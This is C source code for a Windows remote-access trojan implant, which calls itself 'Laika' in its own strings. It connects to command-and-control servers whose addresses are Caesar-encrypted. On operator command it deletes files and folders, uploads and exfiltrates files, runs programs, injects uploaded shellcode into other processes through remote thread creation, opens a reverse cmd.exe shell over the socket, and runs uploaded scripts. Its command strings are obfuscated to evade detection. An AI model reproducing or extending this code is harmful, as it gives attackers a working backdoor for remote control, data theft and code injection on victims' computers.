#include "libc.h"
#include "../pasm/include/pasm.h"

#include <Windows.h>
#include <wininet.h>
#include <shlobj_core.h>
#include <stdio.h>

#include "utils.h"
#include "config.h"
#include "resolve_apis.h"
#include "libc.h"
#include "file_explorer.h"

#define SHELLCODE

#ifdef SHELLCODE
#include "shellcode.h"
#endif

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

int started = 0;

#define BUFFER_SIZE 4096
#define SMALL_SLEEP_TIME 50

DWORD WINAPI redirect_i_thread(LPVOID lpParameter) {
	SOCKET sock = (SOCKET)lpParameter;
	char* buffer = Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
	DWORD bytesRead = 0;

	while (1) {
		//Read data from the socket
		memset_(buffer, 0, BUFFER_SIZE);
		bytesRead = Api.recv(sock, buffer, BUFFER_SIZE, 0);
		if (bytesRead > 0) {
			Api.WriteFile(g_hChildStd_IN_Wr, CAESAR_DECRYPT(buffer), bytesRead, NULL, NULL);
			//Api.WriteFile(g_hChildStd_IN_Wr, buffer, bytesRead, NULL, NULL);
		}
		else if (bytesRead == SOCKET_ERROR) {
			break;
		}
		else if (g_hChildStd_IN_Wr == NULL) {
			break;
		}
		else {
			Sleep_(SMALL_SLEEP_TIME);
		}
	}

	Api.Heapfree_(_crt_heap, 0, buffer);
	return 0;
}

DWORD WINAPI redirect_o_thread(LPVOID lpParameter) {
	started = 1;
	SOCKET sock = (SOCKET)lpParameter;
	char* buffer = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
	DWORD bytesRead = 0;
	DWORD bytesAvailable = 0;

	while (1) {
		if (Api.PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &bytesAvailable, NULL)) {
			if (bytesAvailable > 0) {
				if (Api.ReadFile(g_hChildStd_OUT_Rd, buffer, min(BUFFER_SIZE, bytesAvailable), &bytesRead, NULL)) {
					Api.send(sock, CAESAR(buffer), (int)bytesRead, 0);
				}
				else {
					break;
				}
			}
			else {
				Sleep_(SMALL_SLEEP_TIME);
			}
		}
		else if (g_hChildStd_OUT_Rd == NULL) {
			break;
		}
		else {
			DWORD error = Api.GetLastError();
			if (error == ERROR_BROKEN_PIPE) {
				//pipe closed by the process
				break;
			}
		}
	}
	Api.Heapfree_(_crt_heap, 0, buffer);
	return 0;
}

typedef struct t_watch_process_args {
	SOCKET sock;
	HANDLE process;
}watch_process_args;

int should_reset = 0;
DWORD WINAPI watch_process(LPVOID lpParameter) {
	watch_process_args* args = (watch_process_args*)(lpParameter);

	char buffer[1]; // buffer to hold the data
	int n = 0;

	while (1) {
		n = Api.recv(args->sock, buffer, sizeof(buffer), MSG_PEEK);
		if (Api.WaitForSingleObject(args->process, 0) == WAIT_OBJECT_0)
			return 0;
		if (n > 0) {
			// There is data available on the socket, so the connection is still alive
		}
		else {
			// An error occurred or the connection has been closed
			break;
		}
	}

	Api.TerminateProcess(args->process, -1);
	should_reset = 1;

	return 0;
}

void SendShellEndedSignal(SOCKET sock) {
	if (Api.send(sock, "Qfnpf?%xjxxnts%jsiji", strlen("Qfnpf?%xjxxnts%jsiji"), 0) < 0) //Laika: session ended
	{
		//send failed
	}
}

int serv = -1;
HANDLE _crt_heap = 0;
int main(void) {
	InitApis();

	_crt_heap = Api.HeapCreate(0, 0, 0);

	wchar_t wtext[20];
	mbstowcs_(wtext, CAESAR_DECRYPT("hri3j}j"), strlen(CAESAR_DECRYPT("hri3j}j")) + 1);//Plus null
	LPWSTR cmd_char = wtext;

	int sock = 0;
	int first = 1;
	struct sockaddr_in server;
	char* server_reply = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
	server.sin_family = AF_INET;

	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData;
	Api.WSAStartup(wVersionRequested, &wsaData);

retry:
	if (!first) {
		Api.closesocket(sock);
	}
	else {
		first = 0;
	}

	serv++;
	if (serv > FALLBACK_SERVERS - 1) {
		serv = 0;
	}

	//on fait une copie de l'ip chiffrée, puis on la free_
	//ça évite qu'elle reste dans la mémoire trop longtemps
	//ça évite aussi qu'on utilise CAESAR_DECRYPT sur une ip déjà décryptée
	size_t len = strlen(fallback_servers[serv]);
	char* Tmp = Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, len + 1);
	strcpy(Tmp, fallback_servers[serv]);

	server.sin_addr.s_addr = Api.inet_addr(CAESAR_DECRYPT(Tmp));

	Api.Heapfree_(_crt_heap, 0, Tmp);

	server.sin_port = Api.htons(fallback_servers_ip[serv]);

	//Create socket
	sock = Api.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == -1)
	{
		Sleep_(Sleep_TIME);
		goto retry;
	}

	//Connect to remote server
	if (Api.connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		//connect failed
		Sleep_(Sleep_TIME);
		goto retry;
	}

	//keep communicating with server
	while (1)
	{
		memset_(server_reply, 0, BUFFER_SIZE);

		//Receive a reply from the server
		if (Api.recv(sock, server_reply, BUFFER_SIZE, 0) <= 0)
		{
			//recv failed
			Sleep_(Sleep_TIME);
			goto retry;
		}

		if (strncmp_(server_reply, "ijqdknqj", strlen("ijqdknqj")) == 0) { //del_file
			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.Heapfree_(_crt_heap, 0, path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			Api.DeleteFileA(CAESAR_DECRYPT(path));

			Api.Heapfree_(_crt_heap, 0, path);
		}

		if (strncmp_(server_reply, "ijqdinw", strlen("ijqdinw")) == 0) { //del_dir
			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.Heapfree_(_crt_heap, 0, path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			LPCWSTR wstr = ConvertCharToWChar(CAESAR_DECRYPT(path));

			delete_folder(wstr);

			Api.Heapfree_(_crt_heap, 0, (LPWSTR)wstr);
			Api.Heapfree_(_crt_heap, 0, path);
		}

		if (strncmp_(server_reply, "ljydtgodnskt", strlen("ljydtgodnskt")) == 0) { //get_obj_info
			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.Heapfree_(_crt_heap, 0, path);
				Sleep_(Sleep_TIME);
				goto retry;
			}
			char infos = get_obj_info(CAESAR_DECRYPT(path));
			Api.Heapfree_(_crt_heap, 0, path);
			if (Api.send(sock, &infos, 1, 0) < 0) {
				//send failed
				Sleep_(Sleep_TIME);
				goto retry;
			}
		}

		if (strncmp_(server_reply, "ljydiwn{jx", strlen("ljydiwn{jx")) == 0) { //get_drives
			char* drives = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);

			get_drives_list(drives);

			if (Api.send(sock, drives, strlen(drives), 0) < 0) {
				//send failed
				Api.Heapfree_(_crt_heap, 0, drives);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			Api.Heapfree_(_crt_heap, 0, drives);
		}

		if (strncmp_(server_reply, "j}jhzyj", strlen("j}jhzyj")) == 0) { //execute
			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);
			STARTUPINFOA si;
			PROCESS_INFORMATION pi;

			memset_(&si, 0, sizeof(si));
			si.cb = sizeof(si);
			memset_(&pi, 0, sizeof(pi));

			if (Api.recv(sock, path, MAX_PATH, 0) <= 0) {
				Api.Heapfree_(_crt_heap, 0, path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			Api.CreateProcessA(
				NULL,     // Application name
				CAESAR_DECRYPT(path),     // Command line
				NULL,     // Process security attributes
				NULL,     // Primary thread security attributes
				FALSE,       // Handles are not inherited
				CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, // Creation flags
				NULL,     // Use parent's environment block
				NULL,        // Starting directory 
				&si,         // Pointer to STARTUPINFOW structure
				&pi          // Pointer to PROCESS_INFORMATION structure
			);

			Api.Heapfree_(_crt_heap, 0, path);
		}

#ifdef SHELLCODE
		if (strncmp_(server_reply, "nsojhy", strlen("nsojhy")) == 0) { //inject
			char* arch = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, 2);

			if (Api.recv(sock, arch, 2, 0) <= 0) {
				//send failed
				Api.Heapfree_(_crt_heap, 0, arch);
				Sleep_(Sleep_TIME);
				goto retry;
			}
			CAESAR_DECRYPT(arch);

			size_t fsize = 0;
			char *file = upload_file_to_mem(sock, &fsize);
			if (file == NULL) {
				Api.send(sock, "fail", strlen("fail"), 0);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			HANDLE proc = NULL;
			if (strncmp_(arch, "32", strlen("32")) == 0) {
				proc = FindProcessByArch(L"x86");
			}
			else {
				proc = FindProcessByArch(L"x64");
			}

			Api.Heapfree_(_crt_heap, 0, arch);

			if (proc == NULL) {
				Api.send(sock, "fail", strlen("fail"), 0);
				Api.Heapfree_(_crt_heap, 0, file);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			LPVOID addr = Api.VirtualAllocEx(proc, NULL, fsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (addr == NULL) {
				Api.send(sock, "fail", strlen("fail"), 0);
				Api.Heapfree_(_crt_heap, 0, file);
				Api.CloseHandle(proc);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			if (Api.WriteProcessMemory(proc, addr, file, fsize, NULL) == 0) {
				Api.send(sock, "fail", strlen("fail"), 0);
				Api.Heapfree_(_crt_heap, 0, file);
				Api.CloseHandle(proc);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			HANDLE hThread = Api.CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
			if (hThread == NULL) {
				Api.send(sock, "fail", strlen("fail"), 0);
				Api.Heapfree_(_crt_heap, 0, file);
				Api.CloseHandle(proc);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			Api.Heapfree_(_crt_heap, 0, file);
			Api.CloseHandle(proc);
			Api.CloseHandle(hThread);
			Api.send(sock, "ok", strlen("ok"), 0);
		}
#endif
		if (strncmp_(server_reply, "ljydknqjdqnxy", strlen("ljydknqjdqnxy")) == 0) { //get_file_list
			char* file_list = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.Heapfree_(_crt_heap, 0, file_list);
				Api.Heapfree_(_crt_heap, 0, path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			int num_files = 0;
			file_list = get_file_list(CAESAR_DECRYPT(path), &num_files);

			if (file_list == NULL) {
				Api.Heapfree_(_crt_heap, 0, file_list);
				Api.Heapfree_(_crt_heap, 0, path);
				Sleep_(Sleep_TIME);
				goto retry;
			}


			if (Api.send(sock, file_list, strlen(file_list), 0) < 0) {
				//send failed
				Api.Heapfree_(_crt_heap, 0, file_list);
				Api.Heapfree_(_crt_heap, 0, path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			Api.Heapfree_(_crt_heap, 0, path);
		}

		if (strncmp_(server_reply, "it|sqtfidknqj", strlen("it|sqtfidknqj")) == 0) { //download_file
			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.Heapfree_(_crt_heap, 0, path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			HANDLE hFile = Api.CreateFileA(CAESAR_DECRYPT(path), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			Api.Heapfree_(_crt_heap, 0, path);

			if (hFile == NULL)
			{
				Sleep_(Sleep_TIME);
				goto retry;
			}

			if (download_file(hFile, sock) == 0) {
				Sleep_(Sleep_TIME);
				goto retry;
			}
		}

		if (strncmp_(server_reply, "zuqtfidknqj", strlen("zuqtfidknqj")) == 0) { //upload_file
			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.Heapfree_(_crt_heap, 0, path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			LPCWSTR wstr = ConvertCharToWChar(CAESAR_DECRYPT(path));

			HANDLE file_handle = Api.CreateFileW(wstr, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (file_handle == INVALID_HANDLE_VALUE) {
				Api.Heapfree_(_crt_heap, 0, path);
				Api.Heapfree_(_crt_heap, 0, (LPWSTR)wstr);
				goto retry;
			}

			Api.Heapfree_(_crt_heap, 0, (LPWSTR)wstr);

			upload_file(sock, file_handle);

			Api.CloseHandle(file_handle);
			Api.Heapfree_(_crt_heap, 0, path);
		}

		if (strncmp_(server_reply, "xmjqq", strlen("xmjqq")) == 0) { //shell
			started = 0;
			// Set the socket as standard output and error
			SECURITY_ATTRIBUTES sa;
			sa.nLength = sizeof(SECURITY_ATTRIBUTES);
			sa.bInheritHandle = TRUE;
			sa.lpSecurityDescriptor = NULL;
			if (!Api.CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0)) {
				Api.send(sock, "fail", strlen("fail"), 0);
				SendShellEndedSignal(sock);
				Sleep_(Sleep_TIME);
				goto retry;
			}
			if (!Api.CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &sa, 0)) {
				Api.CloseHandle(g_hChildStd_IN_Rd);
				Api.send(sock, "fail", strlen("fail"), 0);
				SendShellEndedSignal(sock);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			// Create a thread to read from the pipes and write to the socket
			HANDLE hThread = Api.CreateThread(NULL, 0, &redirect_i_thread, (LPVOID)sock, 0, NULL);
			HANDLE hThread2 = Api.CreateThread(NULL, 0, &redirect_o_thread, (LPVOID)sock, 0, NULL);
			if (hThread == NULL || hThread2 == NULL) {
				Api.CloseHandle(g_hChildStd_OUT_Wr);
				Api.CloseHandle(g_hChildStd_IN_Rd);
				Api.send(sock, "fail", strlen("fail"), 0);
				SendShellEndedSignal(sock);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			// Create the process
			STARTUPINFO si;
			memset_(&si, 0, sizeof(STARTUPINFO));
			si.cb = sizeof(STARTUPINFO);
			si.hStdError = g_hChildStd_OUT_Wr;
			si.hStdOutput = g_hChildStd_OUT_Wr;
			si.hStdInput = g_hChildStd_IN_Rd;
			si.dwFlags |= STARTF_USESTDHANDLES;

			PROCESS_INFORMATION pi;
			memset_(&pi, 0, sizeof(PROCESS_INFORMATION));

			if (!Api.CreateProcessW(NULL, cmd_char, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { //cmd.exe
				Api.send(sock, "fail", strlen("fail"), 0);
				SendShellEndedSignal(sock);
				Api.CloseHandle(g_hChildStd_OUT_Wr);
				Api.CloseHandle(g_hChildStd_IN_Rd);

				if (hThread != NULL) {
					Api.TerminateThread(hThread, 0);
					Api.CloseHandle(hThread);
				}
				if (hThread2 != NULL) {
					Api.TerminateThread(hThread2, 0);
					Api.CloseHandle(hThread2);
				}

				Sleep_(Sleep_TIME);
				goto retry;
			}

			watch_process_args args = { sock, pi.hProcess };
			HANDLE hThread3 = Api.CreateThread(NULL, 0, &watch_process, &args, 0, NULL);

			if (started == 0) {
				SendShellEndedSignal(sock);

				Api.TerminateProcess(pi.hProcess, 0);
				Api.CloseHandle(pi.hProcess);
				Api.CloseHandle(pi.hThread);
				Api.CloseHandle(g_hChildStd_OUT_Wr);
				Api.CloseHandle(g_hChildStd_IN_Rd);
				g_hChildStd_OUT_Wr = NULL;
				g_hChildStd_IN_Rd = NULL;

				if (hThread != NULL) {
					Api.TerminateThread(hThread, 0);
					Api.CloseHandle(hThread);
				}
				if (hThread2 != NULL) {
					Api.TerminateThread(hThread2, 0);
					Api.CloseHandle(hThread2);
				}
				if (hThread3 != NULL) {
					Api.TerminateThread(hThread3, 0);
					Api.CloseHandle(hThread3);
				}
				continue;
			}
			// Wait for the process to finish
			Api.WaitForSingleObject(pi.hProcess, INFINITE);

			SendShellEndedSignal(sock);

			// Close the handles
			Api.CloseHandle(pi.hProcess);
			Api.CloseHandle(pi.hThread);
			Api.CloseHandle(g_hChildStd_OUT_Wr);
			Api.CloseHandle(g_hChildStd_IN_Rd);
			g_hChildStd_OUT_Wr = NULL;
			g_hChildStd_IN_Rd = NULL;

			if (hThread != NULL) {
				Api.TerminateThread(hThread, 0);
				Api.CloseHandle(hThread);
			}
			if (hThread2 != NULL) {
				Api.TerminateThread(hThread2, 0);
				Api.CloseHandle(hThread2);
			}
			if (hThread3 != NULL) {
				Api.TerminateThread(hThread3, 0);
				Api.CloseHandle(hThread3);
			}

			if (should_reset) {
				should_reset = 0;
				goto retry;
			}
		}

		if (strncmp_(server_reply, "ufxr", strlen("ufxr")) == 0) { //pasm
			size_t fsize = 0;
			char* file = upload_file_to_mem(sock, &fsize);
			if (file == NULL) {
				Api.send(sock, "fail", strlen("fail"), 0);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			int line_count = 0;
			char** lines = split_lines(file, &line_count);
			if (lines == NULL) {
				Api.send(sock, "fail", strlen("fail"), 0);
				Api.Heapfree_(_crt_heap, 0, file);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			pasm_run_script(NULL, lines, line_count, sock);

			Api.send(sock, "Qfnpf?%jsi%tk%xhwnuy", strlen("Qfnpf?%jsi%tk%xhwnuy"), 0); //Laika: end of script
			Api.Heapfree_(_crt_heap, 0, file);
			if (lines != NULL)
				Api.Heapfree_(_crt_heap, 0, lines);
		}
	}
	/* Never used
	Api.closesocket(sock);

	free_Apis();
	*/
	return 0;
}

/*
BOOL APIENTRY main(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		main_func();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
*/
